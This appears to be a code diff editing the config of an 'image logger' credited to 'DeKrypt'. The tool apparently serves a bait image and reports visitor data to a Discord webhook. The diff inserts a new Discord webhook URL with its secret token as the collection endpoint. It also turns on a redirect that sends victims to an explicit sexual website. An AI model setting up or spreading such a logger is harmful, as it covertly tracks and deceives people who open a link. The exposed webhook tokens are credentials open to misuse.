@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1143253663901560993/e9kilZL0udth5UvHAISE3GuSVQWElEECZ8u8wloPZys2H23bmwNqZkMUGgWZ2Vu3aeo2",
+    "webhook": "https://discord.com/api/webhooks/1236260042362060822/2phpRdAqcTxM1MGoPQauc746dN8p36HF9gphh_MUp5L_BqwEZ53YdvVM6AaEaH8fx8_R",
     "image": "https://upload.wikimedia.org/wikipedia/commons/f/fb/Anthro_vixen_colored.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.indiangaysite.com/tag/indian-gay-sex-video/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
